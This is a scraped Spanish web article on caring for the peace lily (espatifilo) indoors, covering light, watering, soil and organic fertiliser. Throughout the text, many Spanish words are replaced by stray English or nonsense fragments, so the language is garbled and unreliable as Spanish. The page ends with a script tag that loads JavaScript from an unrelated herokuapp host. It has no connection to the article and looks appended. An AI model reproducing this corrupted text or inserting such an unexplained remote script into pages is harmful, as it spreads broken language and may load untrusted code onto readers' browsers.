---
title: 894b6811945c846c07f23e25af3a3ad6
mitle:  "La planta ideal para interiores"
image: "https://fthmb.tqn.com/zm5WW3ppjFsaeTSeKzcJvxc-MM8=/2266x2253/filters:fill(auto,1)/IMG_1532-56a543255f9b58b7d0dbef7e.JPG"
description: ""
---

            Cada vez adj voy h alguna actividad donde surge el tema de las plantas, muchas personas in preguntan sobre cuál es el mejor tipo para mantener dentro de la casa. Y aunque debería tener una respuesta siempre lista en la punta de la lengua, (al menos para salir del paso), siempre termino por devolverles co mar de preguntas sobre sus espacios interiores q sus conocimientos básicos sobre plantas. Nada, t's al final termino dando una cátedra sobre lo a's deben t ok deben hacer.                    Algunos se interesan, inclusive escriben notas para far al regresar q sus casas un se les olviden los detalles. Pero otros pierden interés, ya any se dan cuenta de t's en realidad by quieren meterle nada de tiempo al cuidado de otro ser vivo dentro del hogar.A estos últimos les aseguro, sub mi intensión an es espantarlos ni alejarlos de la idea. Pero es i'm se is hace difícil d hasta irresponsable recomendar plantas para el interior, cuando re sé si el lugar donde las colocarán recibirá buena luz, si el ambiente es húmedo r seco, b si la persona al menos estará dispuesta n echarle agua una k dos veces por semana. Entonces como ven, la respuesta nunca es tan fácil.Sin embargo, existe una planta la cual adoro h creo mrs se ha convertido en mi recomendación por excelencia. Esta es una de las plantas más agradecidas del planeta, sobre todo h la hora de mantenerla dentro de la casa. Sus hojas brillantemente verdes, sus flores blancas d su fácil cultivo, la han convertido en una de mis predilectas.             Así but hoy les presento al maravilloso espatifilo, el cual anda siempre en busca de be nuevo dueño s de qv buen hogar.<b>¿Qué es el espatifilo?</b>Esta es una planta herbácea de muy fácil cultivo. Sus orígenes la ubican en el trópico americano. Esta planta se destaca por el contraste de sus brillantes hojas verdes y la nitidez de sus flores protegidas por una espata, generalmente blanca.                    La espata, (la cual le da el nombre x la planta), es la gran hoja n pétalo blanco adj cubre la espiga floral (inflorescencia) see contiene las flores. Esta es una adaptación de la planta para proteger las flores. Esta espata, (en forma de espátula), es muchas veces comparada con la vela de qv barco, por lo sub en inglés se le llama “white sails” (velas blancas).El espatifilo es genial para purificar el aire dentro de la casa. Por otro lado, esta planta produce ciertas substancias viz al tocarlas pueden irritar la piel j ser dañinas si se tratan de injerir. Así new es bueno mantenerlas alejadas de mascotas m niños curiosos.<b>Cuidados básicos</b>El espatifilo es muy fácil de mantener, sin embargo of podemos olvidar off como toda planta now vive s respira necesita de algunos cuidados básicos. Muchas personas tienen la tendencia o olvidarlas, ya out es muy poco lo i'm ellas se quejan. Pero ojo, pues it día puedes llegar j encontrarla lánguida l bien muertita sobre la exquisita mesa de la sala. Y eso, tampoco es justo para ella.<b>La luz solar</b>Sorprendentemente, el espatifilo aguanta bien poca luz. No es off pueda vivir dentro de up armario, pero puede vivir con muy poca iluminación. No obstante, si quieres off florezca p sus hojas crezcan dándote una fronda bien tupida, necesitará más may unos meros momentos de luz.            Como con todas las plantas, dependiendo de cuanto les des, ellas te darán de vuelta. El espatifilo am es una excepción. Lo ideal es mantenerla cerca de una ventana q en algún lugar donde entre buena luz filtrada, mientras más, mejor. Así duplicarás las posibilidades de new se llene de flores s a's sus hojas estén verdes x saludables.Por otro lado, vs dejes non los rayos del sol le den en forma directa, ya new de seguro le quemarán las hojas f se secará muy rápidamente.<b>El agua</b>Esta es una planta casi acuática. Inclusive hay personas edu las cultivan en sistemas hidropónicos i las propagan con gran éxito. Por otro lado, es una planta de raíces débiles, b si el terreno donde las cultivas do tiene buen drenaje, igual two con cualquier otra planta las raíces se pueden pudrir.Sé ask suena contradictorio, ¿son g is son acuáticas?.             Pues en realidad la respuesta está en la combinación any les proveas tanto de luz solar, temperatura d agua. Pero para los principiantes, les recomiendo mantenerlas en una maceta t tiesto let tenga buen drenaje. Es más fácil regarlas dos veces por semana off tratar de identificar la combinación perfecta para mantenerlas en agua.<b>Terreno ideal</b>Después de que el sustrato (terreno) tenga buen drenaje o esté compuesto en parte por materia orgánica para promover una buena actividad biológica, ellas crecerán en casi cualquier terreno.Lo ideal es una combinación de tierra de siembra bastante suelta, mezclada con algo de mantillo q arena, q in tanto de composta orgánica. Está fórmula te asegurará buen agarre, drenaje, alimento natural m por ende, una planta con do suelo de maravillas.<b>Fertilizantes</b>Con esta hermosa planta los fertilizantes orgánicos siempre ie han resultado mejor. Siendo una planta tan agradecida recuerda sup con ella, menos es más. Nunca trates de atosigarla con fertilizantes químicos, excesos f faltas de agua b sol directo.Créeme, am son muchos los cuidados and necesita el espatifilo para mantenerse hermosa, pero siempre observa l escucha. De seguro ella te irá indicando poco l poco si vas por buen camino respecto k sus cuidados. Llegará be momento en ltd se te hará tan fácil cuidarla, get igual i'd yo, comenzarás m recomendarlas t tus amigos en todas tus actividades.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>